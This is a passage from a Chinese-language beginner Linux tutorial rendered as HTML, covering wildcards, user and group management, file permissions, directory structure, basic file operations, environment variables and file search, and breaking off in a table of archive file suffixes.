<td style="text-align:left">向前删除一个单词</td>
</tr>
<tr>
<td>Shift+PgUp</td>
<td style="text-align:left">将终端显示向上滚动</td>
</tr>
<tr>
<td>Shift+PgDn</td>
<td style="text-align:left">将终端显示向下滚动</td>
</tr>
</tbody>
</table>
<h2 id="Shell常用通配符"><a href="#Shell常用通配符" class="headerlink" title="Shell常用通配符"></a>Shell常用通配符</h2><table>
<thead>
<tr>
<th>字符</th>
<th style="text-align:left">含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>*</td>
<td style="text-align:left">匹配 0 或多个字符</td>
</tr>
<tr>
<td>?</td>
<td style="text-align:left">匹配任意一个字符</td>
</tr>
<tr>
<td>[list]</td>
<td style="text-align:left">匹配 list 中的任意单一字符</td>
</tr>
<tr>
<td>[!list]</td>
<td style="text-align:left">匹配 除list 中的任意单一字符以外的字符</td>
</tr>
<tr>
<td>[c1-c2]</td>
<td style="text-align:left">匹配 c1-c2 中的任意单一字符 如：[0-9] [a-z]</td>
</tr>
<tr>
<td>{string1,string2,…}</td>
<td style="text-align:left">匹配 sring1 或 string2 (或更多)其一字符串</td>
</tr>
<tr>
<td>{c2..c2}</td>
<td style="text-align:left">匹配 c1-c2 中全部字符 如{1..10}</td>
</tr>
</tbody>
</table>
<h1 id="用户及文件权限管理"><a href="#用户及文件权限管理" class="headerlink" title="用户及文件权限管理"></a>用户及文件权限管理</h1><h2 id="查看用户"><a href="#查看用户" class="headerlink" title="查看用户"></a>查看用户</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ who am i</div><div class="line"></div><div class="line">或者</div><div class="line"></div><div class="line">$ who mom likes</div></pre></td></tr></table></figure>
<p>who 命令其他常用参数</p>
<table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>-a</td>
<td style="text-align:left">打印能打印的全部</td>
</tr>
<tr>
<td>-d</td>
<td style="text-align:left">打印死掉的进程</td>
</tr>
<tr>
<td>-m</td>
<td style="text-align:left">同am i,mom likes</td>
</tr>
<tr>
<td>-q</td>
<td style="text-align:left">打印当前登录用户数及用户名</td>
</tr>
<tr>
<td>-u</td>
<td style="text-align:left">打印当前登录用户登录信息</td>
</tr>
<tr>
<td>-r</td>
<td style="text-align:left">打印运行等级</td>
</tr>
</tbody>
</table>
<h2 id="创建用户"><a href="#创建用户" class="headerlink" title="创建用户"></a>创建用户</h2><p>在Linxu系统里，root账户拥护整个系统至高无上的权利，比如 新建/添加用户。</p>
<h3 id="su-su-与sudo"><a href="#su-su-与sudo" class="headerlink" title="su,su-与sudo"></a>su,su-与sudo</h3><p>su <user>可以切换到用户user，执行时需要输入目标用户的密码，sudo <cmd>可以以特权级别运行cmd命令，需要当前用户属于sudo组，且需要输入当前用户密码。su - <user>命令也是切换用户，同时环境变量也会跟着改变成目标用户的环境变量。</user></cmd></user></p>
<p>新建用户<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ sudo adduser lilei</div></pre></td></tr></table></figure></p>
<p>切换登录用户<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ su -l lilei</div></pre></td></tr></table></figure></p>
<p>退出当前用户跟退出终端一样可以使用 exit 命令或者使用快捷键 Ctrl+d。</p>
<h2 id="用户组"><a href="#用户组" class="headerlink" title="用户组"></a>用户组</h2><h3 id="查看所属用户组"><a href="#查看所属用户组" class="headerlink" title="查看所属用户组"></a>查看所属用户组</h3><p>方法一：使用groups命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ groups lilei</div></pre></td></tr></table></figure></p>
<p>方法二：查看etc/group文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ cat /etc/group | sort</div></pre></td></tr></table></figure></p>
<p>cat 命令用于读取指定文件的内容并打印到终端输出， | sort 表示将读取的文本进行一个字典排序再输出，然后你将看到如下一堆输出<br>可以使用命令过滤掉一些你不想看到的结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ cat /etc/group | grep -E &quot;用户名&quot;</div></pre></td></tr></table></figure></p>
<h3 id="etc-group-文件格式说明"><a href="#etc-group-文件格式说明" class="headerlink" title="etc/group 文件格式说明"></a>etc/group 文件格式说明</h3><p>/etc/group 的内容包括用户组（Group）、用户组口令、GID 及该用户组所包含的用户（User），每个用户组一条记录。格式如下：</p>
<blockquote>
<p>group_name:password:GID:user_list</p>
</blockquote>
<p>你看到上面的 password 字段为一个 ‘x’ 并不是说密码就是它，只是表示密码不可见而已。</p>
<h3 id="将其它用户加入-sudo-用户组"><a href="#将其它用户加入-sudo-用户组" class="headerlink" title="将其它用户加入 sudo 用户组"></a>将其它用户加入 sudo 用户组</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ su -l lilei</div><div class="line">$ sudo ls</div></pre></td></tr></table></figure>
<h2 id="删除用户"><a href="#删除用户" class="headerlink" title="删除用户"></a>删除用户</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ sudo deluser lilei --remove-home</div></pre></td></tr></table></figure>
<h2 id="查看文件权限"><a href="#查看文件权限" class="headerlink" title="查看文件权限"></a>查看文件权限</h2><p>使用较长格式列出文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ ls -l</div></pre></td></tr></table></figure></p>
<p>图解：</p>
<p><img src="https://dn-anything-about-doc.qbox.me/linux_base/3-9.png/logoblackfont" alt=""></p>
<p>可能你还是不太明白，比如第一项文件类型和权限那一堆东西具体指什么，链接又是什么，何为最后修改时间，下面一一道来：</p>
<p><img src="https://dn-anything-about-doc.qbox.me/linux_base/3-10.png/logoblackfont" alt=""></p>
<ul>
<li>文件类型</li>
</ul>
<p>关于文件类型，这里有一点你必需时刻牢记<strong>Linux 里面一切皆文件</strong>，正因为这一点才有了设备文件（ <code>/dev</code> 目录下有各种设备文件，大都跟具体的硬件设备相关）这一说，还有 <code>socket</code>（网络套接字，具体是什么，感兴趣的用户可以自己去了解或期待实验楼的后续相关课程），和 <code>pipe</code> (管道，这个东西很重要，我们以后将会讨论到，这里你先知道有它的存在即可)。软链接文件，链接文件是分为两种的，另一种当然是“硬链接”(硬链接不常用，具体内容不作为本课程讨论重点，而软链接等同于 Windows 上的快捷方式,你记住这一点就够了）</p>
<ul>
<li>文件权限</li>
</ul>
<p>读权限，表示你可以使用 <code>cat &amp;lt;file name&amp;gt;</code> 之类的命令来读取某个文件的内容;写权限，表示你可以编辑和修改某个文件；<br>执行权限，通常指可以运行的二进制程序文件或者脚本文件，如同 Windows 上的 ‘exe’ 后缀的文件，不过 Linux 上不是通过文件后缀名来区分文件的类型。你需要注意的一点是，<strong>一个目录要同时具有读权限和执行权限才可以打开，而一个目录要有写权限才允许在其中创建其它文件</strong>，这是因为目录文件实际保存着该目录里面的文件的列表等信息</p>
<p>所有者权限，这一点相信你应该明白了，至于所属用户组权限，是指你所在的用户组中的所有其它用户对于该文件的权限，比如，你有一个艾派德,那么这个用户组权限就决定了你的兄弟姐妹有没有权限使用它破坏它和占有它。</p>
<ul>
<li><p>链接数</p>
<blockquote>
<p>链接到该文件所在的 inode 结点的文件名数目（关于这个概念涉及到 Linux 文件系统的相关概念知识，不在本课程的讨论范围，感兴趣的用户可以自己去了解）。</p>
</blockquote>
</li>
<li><p>文件大小</p>
<blockquote>
<p>以 inode 结点大小为单位来表示的文件大小，你可以给 ls 加上 <code>-lh</code> 参数来更直观的查看文件的大小。</p>
</blockquote>
</li>
</ul>
<p>明白了文件权限的一些概念，我们顺带补充一下关于 <code>ls</code> 命令的一些其它常用的用法：</p>
<p><ul></ul></p>
<ul>
<li>显示除了 ‘.’(当前目录)，’..’ 上一级目录之外的所有包含隐藏文件（Linux 下以 ‘.’ 开头的文件为隐藏文件）</li>
</ul>
<p>可以同时使用“-A”和“-l”参数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ ls -Al</div></pre></td></tr></table></figure></p>
<p>查看某一个目录的完整属性，而不是显示目录里面的文件属性<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ ls -dl &lt;目录名&gt;</div></pre></td></tr></table></figure></p>
<p>显示所有文件的大小<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ ls -AsSh</div></pre></td></tr></table></figure></p>
<p>其中小 s 为显示文件大小，大 S 为按文件大小排序，若需要知道如何按其它方式排序</p>
<h2 id="修改文件权限"><a href="#修改文件权限" class="headerlink" title="修改文件权限"></a>修改文件权限</h2><p>对文件的权限做修改，这里有两种方式：</p><p></p>
<ul>
<li>方式一：二进制数字表示</li>
</ul>
<p><img src="https://dn-anything-about-doc.qbox.me/linux_base/3-14.png/logoblackfont" alt=""></p>
<p>每个文件的三组权限（拥有者，所属用户组，其他用户,<strong>记住这个顺序是一定的</strong>）就对应这一个 “rwx”，也就是一个 ‘7’ ,所以如果我要将文件“iphone6”的权限改为只有我自己可以用那么就这样:</p>
<p>为了演示，我先在文件里加点内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ echo &quot;echo \&quot;hello shiyanlou\&quot;&quot; &gt; iphone6</div></pre></td></tr></table></figure></p>
<p>然后修改权限：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ chmod 700 iphone6</div></pre></td></tr></table></figure>
<ul>
<li>方式二：加减赋值操作</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">go-rw iphone</div></pre></td></tr></table></figure>
<p>‘g’’o’还有’u’，分别表示group，others，user，’+’，’-‘ 就分别表示增加和去掉相应的权限。</p>
<h2 id="FHS"><a href="#FHS" class="headerlink" title="FHS"></a>FHS</h2><blockquote>
<p>FHS（英文：Filesystem Hierarchy Standard 中文：文件系统层次结构标准），多数 Linux 版本采用这种文件组织形式，FHS 定义了系统中每个区域的用途、所需要的最小构成的文件和目录同时还给出了例外处理与矛盾处理。</p>
</blockquote>
<p><img src="https://dn-anything-about-doc.qbox.me/linux_base/4-1.png/logoblackfont" alt=""></p>
<p>FHS 是根据以往无数 Linux 用户和开发者的经验总结出来的，并且会维持更新，FHS 依据文件系统使用的频繁与否以及是否允许用户随意改动（注意，不是不能，学习过程中，不要怕这些），将目录定义为四种交互作用的形态，如下表所示：</p><br><img src="https://dn-anything-about-doc.qbox.me/linux_base/4-2.png/logoblackfont" alt=""><p></p>
<h1 id="Linux目录结构及文件基本操作"><a href="#Linux目录结构及文件基本操作" class="headerlink" title="Linux目录结构及文件基本操作"></a>Linux目录结构及文件基本操作</h1><h2 id="目录路径"><a href="#目录路径" class="headerlink" title="目录路径"></a>目录路径</h2><h3 id="路径"><a href="#路径" class="headerlink" title="路径"></a>路径</h3><p>使用 <code>cd</code> 命令可以切换目录，在 Linux 里面使用 <code>.</code> 表示当前目录，<code>..</code> 表示上一级目录（**注意，还记得我们上一节介绍过的，以 <code>.</code> 开头的文件都是隐藏文件，所以这两个目录必然也是隐藏的，你可以使用 <code>ls -a</code> 命令查看隐藏文件）, <code>-</code> 表示上一次所在目录，<code>～</code> 通常表示当前用户的”home”目录。使用 <code>pwd</code> 命令可以获取当前所在路径（绝对路径）。</p><p></p>
<p>进入上一级目录：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cd ..</div></pre></td></tr></table></figure>
<p> 进入你的“home”目录：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">cd ~ </div><div class="line">或者 cd /home/你的用户名</div></pre></td></tr></table></figure>
<p>使用 <code>pwd</code> 获取当前路径：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pwd</div></pre></td></tr></table></figure></p>
<h3 id="绝对路径"><a href="#绝对路径" class="headerlink" title="绝对路径"></a>绝对路径</h3><p>关于绝对路径，简单地说就是以根”/“目录为起点的完整路径，以你所要到的目录为终点，表现形式如：<br><code>/usr/local/bin</code>，表示根目录下的 usr 目录中的 local 目录中的 bin 目录。</p>
<h3 id="相对路径"><a href="#相对路径" class="headerlink" title="相对路径"></a>相对路径</h3><p>相对路径，也就是相对于你当前的目录的路径，相对路径是以当前目录 <code>.</code> 为起点，以你所要到的目录为终点，表现形式如：<br><code>usr/local/bin</code> （这里假设你当前目录为根目录）。你可能注意到，我们表示相对路径实际并没有加上表示当前目录的那个 <code>.</code> ，而是直接以目录名开头，因为这个 <code>usr</code> 目录为 <code>/</code> 目录下的子目录，是可以省略这个 <code>.</code> 的（以后会讲到一个类似不能省略的情况）；如果是当前目录的上一级目录，则需要使用 <code>..</code> ，比如你当前目录为“home”目录，根目录就应该表示为 <code>../../</code> ,表示上一级目录（”home”目录）的上一级目录（”/“目录）。</p>
<h2 id="新建"><a href="#新建" class="headerlink" title="新建"></a>新建</h2><h3 id="新建空白文件"><a href="#新建空白文件" class="headerlink" title="新建空白文件"></a>新建空白文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ cd ~</div><div class="line">$ touch test</div></pre></td></tr></table></figure>
<h3 id="新建目录"><a href="#新建目录" class="headerlink" title="新建目录"></a>新建目录</h3><p>创建名为”mydir”的空目录：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mkdir mydir</div></pre></td></tr></table></figure></p>
<p>使用 -p 参数，同时创建父目录（如果不存在该父目录），如下我们同时创建一个多级目录（这在有时候安装软件，配置安装路径时非常有用）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ mkdir -p father/son/grandson</div></pre></td></tr></table></figure></p>
<h2 id="复制"><a href="#复制" class="headerlink" title="复制"></a>复制</h2><h3 id="复制文件"><a href="#复制文件" class="headerlink" title="复制文件"></a>复制文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ cp test father/son/grandson</div></pre></td></tr></table></figure>
<h3 id="复制目录"><a href="#复制目录" class="headerlink" title="复制目录"></a>复制目录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ cp -r father family</div></pre></td></tr></table></figure>
<p>加上-r或者-R参数，表示递归复制</p>
<h2 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h2><h3 id="删除文件"><a href="#删除文件" class="headerlink" title="删除文件"></a>删除文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ rm test</div></pre></td></tr></table></figure>
<p>-f 参数强制删除<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ rm -f test</div></pre></td></tr></table></figure></p>
<h3 id="删除目录"><a href="#删除目录" class="headerlink" title="删除目录"></a>删除目录</h3><p>删除一个目录，也需要加上-r或-R参数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ rm -r family</div></pre></td></tr></table></figure></p>
<h2 id="移动文件与文件重命名"><a href="#移动文件与文件重命名" class="headerlink" title="移动文件与文件重命名"></a>移动文件与文件重命名</h2><h3 id="移动文件"><a href="#移动文件" class="headerlink" title="移动文件"></a>移动文件</h3><p>使用<code>mv</code>(move or rename files)命令，移动文件（剪切）。将文件”file1”移动到”Documents”目录<code>mv 源目录文件 目的目录</code>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ mkdir Documents</div><div class="line">$ mv file1 Documents</div></pre></td></tr></table></figure></p>
<h3 id="重命名文件"><a href="#重命名文件" class="headerlink" title="重命名文件"></a>重命名文件</h3><p>将文件”file1”重命名为”myfile” <code>mv 旧的文件名 新的文件名</code>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ mv file1 myfile</div></pre></td></tr></table></figure></p>
<h3 id="批量重命名"><a href="#批量重命名" class="headerlink" title="批量重命名"></a>批量重命名</h3><p>使用一个看起来更专业的命令rename来实现。不过它是要用 perl 正则表达式来作为参数，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"># 使用通配符批量创建 5 个文件</div><div class="line">$ touch file&#123;1..5&#125;.txt</div><div class="line"></div><div class="line"># 批量将这 5 个后缀为 .txt 的文本文件重命名为以 .c 为后缀的文件</div><div class="line">$ rename &apos;s/\.txt/\.c/&apos; *.txt</div><div class="line"></div><div class="line"># 批量将这 5 个文件，文件名改为大写</div><div class="line">$ rename &apos;y/a-z/A-Z/&apos; *.c</div></pre></td></tr></table></figure>
<p>rename是先使用第二个参数的通配符匹配所有后缀为.txt的文件，然后使用第一个参数提供的正则表达式将匹配的这些文件的.txt后缀替换为.c，</p>
<h2 id="查看文件"><a href="#查看文件" class="headerlink" title="查看文件"></a>查看文件</h2><h3 id="使用cat-tac和nl命令查看文件"><a href="#使用cat-tac和nl命令查看文件" class="headerlink" title="使用cat,tac和nl命令查看文件"></a>使用<code>cat</code>,<code>tac</code>和<code>nl</code>命令查看文件</h3><p><code>cat</code>为正序显示，<code>tac</code>倒序显示。</p>
<p>cat 加上<code>-n</code>参数显示行号：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ cat -n passwd</div></pre></td></tr></table></figure></p>
<p>nl 的几个参数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">-b : 指定添加行号的方式，主要有两种：</div><div class="line">    -b a:表示无论是否为空行，同样列出行号(&quot;cat -n&quot;就是这种方式)</div><div class="line">    -b t:只列出非空行的编号并列出（默认为这种方式）</div><div class="line">-n : 设置行号的样式，主要有三种：</div><div class="line">    -n ln:在行号字段最左端显示</div><div class="line">    -n rn:在行号字段最右边显示，且不加 0</div><div class="line">    -n rz:在行号字段最右边显示，且加 0</div><div class="line">-w : 行号字段占用的位数(默认为 6 位)</div></pre></td></tr></table></figure></p>
<h3 id="使用more和less命令分页查看文件"><a href="#使用more和less命令分页查看文件" class="headerlink" title="使用more和less命令分页查看文件"></a>使用<code>more</code>和<code>less</code>命令分页查看文件</h3><p>使用<code>more</code>工具打开<code>passwd</code>文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ more passwd</div></pre></td></tr></table></figure></p>
<p>可以使用Enter键向下滚动一行，使用Space键向下滚动一屏，按下h显示帮助，q退出。</p>
<h3 id="使用head和tail命令查看文件"><a href="#使用head和tail命令查看文件" class="headerlink" title="使用head和tail命令查看文件"></a>使用<code>head</code>和<code>tail</code>命令查看文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ tail /etc/passwd</div></pre></td></tr></table></figure>
<p>加上-n参数，后面紧跟行数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ tail -n 1 /etc/passwd</div></pre></td></tr></table></figure></p>
<h2 id="查看文件类型"><a href="#查看文件类型" class="headerlink" title="查看文件类型"></a>查看文件类型</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ file /bin/ls</div></pre></td></tr></table></figure>
<h1 id="环境变量与文件查找"><a href="#环境变量与文件查找" class="headerlink" title="环境变量与文件查找"></a>环境变量与文件查找</h1><h2 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h2><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ declare tmp      #使用declare命令创建一个变量名为tmp的变量</div><div class="line">$ tmp=shiyanlou    #使用=号赋值运算符为变量 tmp 赋值为 shiyanlou</div><div class="line">$ echo $tmp        #读取变量的值，使用echo命令和$符号</div></pre></td></tr></table></figure>
<p>注意:关于变量名，并不是任何形式的变量名都是可用的，变量名只能是英文字母,数字或者下划线，且不能以数字作为开头</p>
<h3 id="环境变量-1"><a href="#环境变量-1" class="headerlink" title="环境变量"></a>环境变量</h3><p>在所有的 UNIX 和类 UNIX 系统中，每个进程都有其各自的环境变量设置，且默认情况下，当一个进程被创建时，处理创建过程中明确指定的话，它将继承其父进程的绝大部分环境设置。Shell 程序也作为一个进程运行在操作系统之上，而我们在  Shell中运行的大部分命令都将以 Shell 的子进程的方式运行。</p><br><img src="https://dn-anything-about-doc.qbox.me/linux_base/5-2.png/logoblackfont" alt=""><p></p>
<p>环境变量有三种：</p>
<ul>
<li>当前 Shell 进程私有用户自定义变量，如上面我们创建的 temp 变量，只在当前 Shell 中有效。</li>
<li>Shell 本身内建的变量。</li>
<li>从自定义变量导出的环境变量。</li>
</ul>
<table>
<thead>
<tr>
<th>命令</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>set</td>
<td style="text-align:left">显示当前 Shell 所有环境变量，包括其内建环境变量（与 Shell 外观等相关），用户自定义变量及导出的环境变量</td>
</tr>
<tr>
<td>env</td>
<td style="text-align:left">显示与当前用户相关的环境变量，还可以让命令在指定环境中运行</td>
</tr>
<tr>
<td>export</td>
<td style="text-align:left">显示从 Shell 中导出成环境变量的变量，也能通过它将自定义变量导出为环境变量</td>
</tr>
</tbody>
</table>
<p><img src="https://dn-anything-about-doc.qbox.me/linux_base/5-3.png/logoblackfont" alt=""></p>
<p><img src="https://dn-anything-about-doc.qbox.me/linux_base/5-5.png/logoblackfont" alt=""><br><strong>注意：为了与普通变量区分，通常我们习惯将环境变量名设为大写</strong></p>
<h3 id="命令的查找路径与顺序"><a href="#命令的查找路径与顺序" class="headerlink" title="命令的查找路径与顺序"></a>命令的查找路径与顺序</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ echo $PATH     #查看PATH环境变量的内容</div><div class="line">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games</div></pre></td></tr></table></figure>
<h3 id="添加自定义路径到”PATH”环境变量"><a href="#添加自定义路径到”PATH”环境变量" class="headerlink" title="添加自定义路径到”PATH”环境变量"></a>添加自定义路径到”PATH”环境变量</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$ PATH=$PATH:/home/shiyanlou/mybin                     #PATH里面的路径是以：作为分隔符</div><div class="line">.zshrc      #zsh的配置文件</div><div class="line">.bashrc     #bashrc的配置文件</div><div class="line">$ echo &quot;PATH=$PATH:/home/shiyanlou/mybin&quot; &gt;&gt; .zshrc    #添加内容到.zshrc</div><div class="line">&gt;&gt;          #表示将标准输出以追加的方式重定向到一个文件中</div><div class="line">&gt;           #是以覆盖的方式重定向到一个文件</div></pre></td></tr></table></figure>
<h3 id="修改和删除已有变量"><a href="#修改和删除已有变量" class="headerlink" title="修改和删除已有变量"></a>修改和删除已有变量</h3><h4 id="变量修改"><a href="#变量修改" class="headerlink" title="变量修改"></a>变量修改</h4><p>修改方式</p>
<table>
<thead>
<tr>
<th>变量设置方式</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>${变量名#匹配字串}</td>
<td style="text-align:left">从头向后开始匹配，删除符合匹配字串的最短数据</td>
</tr>
<tr>
<td>${变量名##匹配字串}</td>
<td style="text-align:left">从头向后开始匹配，删除符合匹配字串的最长数据</td>
</tr>
<tr>
<td>${变量名%匹配字串}</td>
<td style="text-align:left">从尾向前开始匹配，删除符合匹配字串的最短数据</td>
</tr>
<tr>
<td>${变量名%%匹配字串}</td>
<td style="text-align:left">从尾向前开始匹配，删除符合匹配字串的最长数据</td>
</tr>
<tr>
<td>${变量名/旧的字串/新的字串}</td>
<td style="text-align:left">将符合旧字串的第一个字串替换为新的字串</td>
</tr>
<tr>
<td>${变量名//旧的字串/新的字串}</td>
<td style="text-align:left">将符合旧字串的全部字串替换为新的字串</td>
</tr>
</tbody>
</table>
<h3 id="变量删除"><a href="#变量删除" class="headerlink" title="变量删除"></a>变量删除</h3><p>可以使用<code>unset</code>命令删除一个环境变量<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ unset temp</div></pre></td></tr></table></figure></p>
<h2 id="环境变量生效"><a href="#环境变量生效" class="headerlink" title="环境变量生效"></a>环境变量生效</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ source .zshrc             #使用source命令来让变量立即生效</div><div class="line">$ . ./.zshrc                # .的作用和source一样  注意：第一个点后面有一个空格，而且后面的文件必须指定完整的绝对或相对路径名</div></pre></td></tr></table></figure>
<h2 id="搜索文件"><a href="#搜索文件" class="headerlink" title="搜索文件"></a>搜索文件</h2><p>常见的命令：<code>whereis</code>，<code>which</code>,<code>find</code>,<code>locata</code></p>
<ul>
<li><p><code>whereis</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$whereis who        #直接从数据库中查询，只能搜索二进制文件（-b）,man帮助文件（-m）和源代码（-s）。</div></pre></td></tr></table></figure>
</li>
<li><p><code>locate</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ locate /etc/sh    #查找 /etc 下所有以 sh 开头的文件，此方式通过&quot;/var/lib/mlocate/mlocate.db&quot;数据库查找</div><div class="line">$ locate /usr/share/\*.jpg   #查找 /usr/share/ 下所有 jpg 文件（添加*号前面的反斜杠转义）</div><div class="line">-c   #统计数目</div><div class="line">-i   #忽略大小写查找</div></pre></td></tr></table></figure>
</li>
<li><p><code>find</code><br>通过文件类型、文件名进行查找而且可以根据文件的属性（如文件的时间戳，文件的权限等）进行搜索</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ find /etc/ -name interfaces     #指定目录下搜索指定文件名的文件</div></pre></td></tr></table></figure>
</li>
</ul>
<blockquote>
<p>注意 find 命令的路径是作为第一个参数的， 基本命令格式为 find [path] [option] [action]</p>
</blockquote>
<table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>-atime</td>
<td style="text-align:left">最后访问时间</td>
</tr>
<tr>
<td>-ctime</td>
<td style="text-align:left">创建时间</td>
</tr>
<tr>
<td>-mtime</td>
<td style="text-align:left">最后修改时间</td>
</tr>
</tbody>
</table>
<p><code>-mtime</code>参数举例：</p>
<ul>
<li><code>-mtime n</code>: n 为数字，表示为在n天之前的”一天之内“修改过的文件</li>
<li><code>-mtime +n</code>: 列出在n天之前（不包含n天本身）被修改过的文件</li>
<li><code>-mtime -n</code>: 列出在n天之内（包含n天本身）被修改过的文件</li>
<li><code>newer file</code>: file为一个已存在的文件，列出比file还要新的文件名<br><img src="https://dn-anything-about-doc.qbox.me/linux_base/5-8.png" alt=""></li>
</ul>
<h1 id="文件打包与压缩"><a href="#文件打包与压缩" class="headerlink" title="文件打包与压缩"></a>文件打包与压缩</h1><h2 id="文件打包和解压缩"><a href="#文件打包和解压缩" class="headerlink" title="文件打包和解压缩"></a>文件打包和解压缩</h2><table>
<thead>
<tr>
<th>文件后缀名</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>*.zip</td>
<td style="text-align:left">zip程序打包压缩的文件</td>
</tr>
<tr>
<td>*.rar</td>
<td style="text-align:left">创建时间</td>
</tr>
<tr>
<td>*.7z</td>
<td style="text-align:left">7zip程序压缩的文件</td>
</tr>
<tr>
<td>*.tar</td>
<td style="text-align:left">tar程序打包，未压缩的文件</td>
</tr>
<tr>
<td>*.gz</td>
<td style="text-align:left">gzip程序(GNU zip)压缩的文件</td>
</tr>
<tr>
<td>*.xz</td>
<td style="text-align:left">xz程序压缩的文件</td>
</tr>
<tr>
<td>*.bz2</td>
